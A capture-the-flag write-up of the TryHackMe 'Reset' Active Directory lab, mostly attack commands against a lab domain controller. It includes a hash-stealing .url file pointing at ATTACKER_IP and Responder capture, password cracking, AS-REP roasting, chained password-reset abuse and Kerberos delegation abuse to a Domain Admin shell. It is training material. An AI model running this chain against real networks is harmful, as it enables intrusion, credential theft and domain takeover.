# TryHackMe — Reset

**Category:** Active Directory Enumeration
**Difficulty:** Hard
**Target:** HayStack.thm.corp
**IP:** 10.10.122.186

---

## Tools Used

* **Nmap** – Network and service enumeration
* **CrackMapExec (CME)** – SMB enumeration, user discovery, share permissions
* **SMBClient** – Manual interaction with SMB shares
* **Responder** – NTLM hash capture
* **John the Ripper** – Offline password cracking
* **Impacket Suite**

  * `GetNPUsers.py` – AS-REP roasting
  * `getST.py` – Kerberos delegation abuse (S4U)
  * `wmiexec.py` – Remote command execution
* **Evil-WinRM** – Initial shell access
* **BloodHound / bloodhound-python** – Active Directory attack path analysis
* **RPCClient / net rpc** – Password reset abuse
* **RockYou.txt** – Wordlist for password cracking

---

## Enumeration

### Nmap Scan

```bash
sudo nmap -p- -sC -sV 10.10.122.186
```

Key findings:

* Domain Controller services exposed
* SMB signing enabled
* Hostname: `HAYSTACK`
* Domain: `thm.corp`

Add domain resolution:

```bash
sudo nano /etc/hosts
10.10.122.186 haystack.thm.corp thm.corp
```

---

## SMB Enumeration

### Share Enumeration (Guest)

```bash
crackmapexec smb thm.corp -u guest -p "" --shares
```

Result:

* `Data` share → **READ, WRITE**

Manual access:

```bash
smbclient //thm.corp/Data -N
```

Discovered onboarding email revealing:

* Default password
* Valid username format

---

## User Enumeration

### RID Brute Force

```bash
crackmapexec smb thm.corp -u guest -p "" --rid-brute
```

Valid domain users extracted and saved:

```bash
cat users.txt
```

---

## NTLM Hash Capture (SMB Write Abuse)

### Malicious `.url` File

```ini
[InternetShortcut]
URL=whatever
WorkingDirectory=whatever
IconFile=\\ATTACKER_IP\%USERNAME%.icon
IconIndex=1
```

Upload to SMB share:

```bash
put shell.url
```

### Start Responder

```bash
sudo responder -I tun0
```

Captured NTLMv2 hash for user **AUTOMATE**.

---

## Password Cracking

```bash
john automate.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

Recovered credentials:

```
AUTOMATE : Passw0rd1
```

---

## Initial Access

```bash
evil-winrm -i thm.corp -u AUTOMATE -p 'Passw0rd1'
```

Verification:

```powershell
whoami
hostname
```

---

## AS-REP Roasting

```bash
impacket-GetNPUsers thm.corp/AUTOMATE:Passw0rd1 -request
```

Cracking AS-REP hashes:

```bash
john asrep.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

Recovered credentials:

```
TABATHA_BRITT : marlboro(1985)
```

---

## Active Directory Enumeration (BloodHound)

```bash
bloodhound-python -c All \
-u TABATHA_BRITT \
-p 'marlboro(1985)' \
-d thm.corp \
-ns 10.10.186.78 \
--zip
```

Identified attack chain:

```
TABATHA_BRITT
 → GenericAll → SHAWNA_BRAY
   → ForceChangePassword → CRUZ_HALL
     → GenericWrite → DARLA_WINTERS
```

---

## Password Reset Abuse

### Reset Passwords via RPC

```bash
net rpc password SHAWNA_BRAY 'Password123' \
-U thm.corp/TABATHA_BRITT%marlboro(1985) \
-S 10.10.186.78
```

```bash
net rpc password CRUZ_HALL 'Password456' \
-U thm.corp/SHAWNA_BRAY%Password123 \
-S 10.10.186.78
```

```bash
net rpc password DARLA_WINTERS 'Password789' \
-U thm.corp/CRUZ_HALL%Password456 \
-S 10.10.186.78
```

Validate access:

```bash
crackmapexec smb thm.corp -u DARLA_WINTERS -p 'Password789' --shares
```

---

## Kerberos Delegation Abuse (Domain Admin)

### Request Kerberos Ticket (S4U)

```bash
impacket-getST -k \
-impersonate Administrator \
-spn cifs/HayStack.thm.corp \
thm.corp/DARLA_WINTERS
```

Export ticket:

```bash
export KRB5CCNAME=Administrator.ccache
```

---

## Domain Admin Shell

```bash
impacket-wmiexec -k -no-pass Administrator@HayStack.thm.corp
```

Verification:

```cmd
whoami
hostname
```

Retrieved **root flag**, completing the lab.

---

## Key Lessons Learned

* SMB write access can directly lead to NTLM compromise
* AS-REP roasting is still highly effective
* Password reset permissions are equivalent to account takeover
* BloodHound is essential for real-world AD attacks
* Kerberos delegation misconfigurations can result in silent domain compromise

